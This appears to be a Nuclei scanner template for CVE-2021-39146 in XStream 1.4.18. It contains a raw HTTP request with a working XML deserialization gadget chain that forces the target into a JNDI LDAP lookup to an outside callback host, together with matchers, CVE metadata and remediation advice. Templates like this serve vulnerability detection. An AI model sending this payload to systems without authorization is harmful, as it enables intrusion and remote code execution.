http:
- matchers:
  - part: interactsh_protocol
    type: word
    words:
    - dns
  - condition: or
    part: body
    type: word
    words:
    - timestamp
    - com.thoughtworks.xstream
  - part: header
    type: word
    words:
    - application/json
  - status:
    - 500
    type: status
  matchers-condition: and
  raw:
  - "POST / HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/xml\n\n<sorted-set>\n\
    \  <javax.naming.ldap.Rdn_-RdnEntry>\n    <type>test</type>\n    <value class='javax.swing.MultiUIDefaults'\
    \ serialization='custom'>\n      <unserializable-parents/>\n      <hashtable>\n\
    \          <default>\n            <loadFactor>0.75</loadFactor>\n            <threshold>525</threshold>\n\
    \          </default>\n          <int>700</int>\n          <int>0</int>\n    \
    \  </hashtable>\n      <javax.swing.UIDefaults>\n          <default>\n       \
    \     <defaultLocale>zh_CN</defaultLocale>\n            <resourceCache/>\n   \
    \       </default>\n      </javax.swing.UIDefaults>\n      <javax.swing.MultiUIDefaults>\n\
    \          <default>\n            <tables>\n            <javax.swing.UIDefaults\
    \ serialization='custom'>\n              <unserializable-parents/>\n         \
    \     <hashtable>\n                <default>\n                  <loadFactor>0.75</loadFactor>\n\
    \                  <threshold>525</threshold>\n                </default>\n  \
    \              <int>700</int>\n                <int>1</int>\n                <string>lazyValue</string>\n\
    \                <javax.swing.UIDefaults_-ProxyLazyValue>\n                  <className>javax.naming.InitialContext</className>\n\
    \                  <methodName>doLookup</methodName>\n                  <args>\n\
    \                    <string>ldap://{{interactsh-url}}/#evil</string>\n      \
    \            </args>\n                </javax.swing.UIDefaults_-ProxyLazyValue>\n\
    \              </hashtable>\n              <javax.swing.UIDefaults>\n        \
    \        <default>\n                  <defaultLocale reference='../../../../../../../javax.swing.UIDefaults/default/defaultLocale'/>\n\
    \                  <resourceCache/>\n                </default>\n            \
    \  </javax.swing.UIDefaults>\n            </javax.swing.UIDefaults>\n        \
    \    </tables>\n          </default>\n      </javax.swing.MultiUIDefaults>\n \
    \   </value>\n  </javax.naming.ldap.Rdn_-RdnEntry>\n  <javax.naming.ldap.Rdn_-RdnEntry>\n\
    \    <type>test</type>\n    <value class='com.sun.org.apache.xpath.internal.objects.XString'>\n\
    \      <m__obj class='string'>test</m__obj>\n    </value>\n  </javax.naming.ldap.Rdn_-RdnEntry>\n\
    </sorted-set>\n"
id: CVE-2021-39146
info:
  author: pwnhxl
  classification:
    cpe: cpe:2.3:a:xstream_project:xstream:*:*:*:*:*:*:*:*
    cve-id: CVE-2021-39146
    cvss-metrics: CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 8.5
    cwe-id: CWE-434
    epss-percentile: 0.979
    epss-score: 0.54176
  description: 'XStream 1.4.18 is susceptible to remote code execution. An attacker
    can execute commands of the host by manipulating the processed input stream, thereby
    making it possible to obtain sensitive information, modify data, and/or execute
    unauthorized administrative operations in the context of the affected site. Setups
    which followed XStream''s security recommendations with an allow-list are not
    impacted.

    '
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute arbitrary code on the affected system.

    '
  metadata:
    max-request: 1
    product: xstream
    vendor: xstream_project
  name: XStream 1.4.18 - Arbitrary Code Execution
  reference:
  - https://x-stream.github.io/CVE-2021-39146.html
  - https://github.com/x-stream/xstream/security/advisories/GHSA-p8pq-r894-fm8f
  - https://security.netapp.com/advisory/ntap-20210923-0003/
  - https://nvd.nist.gov/vuln/detail/CVE-2021-39146
  - https://lists.debian.org/debian-lts-announce/2021/09/msg00017.html
  remediation: 'Upgrade XStream to a version that is not affected by CVE-2021-39146.

    '
  severity: high
  tags: cve2021,cve,xstream,deserialization,rce,xstream_project,vuln
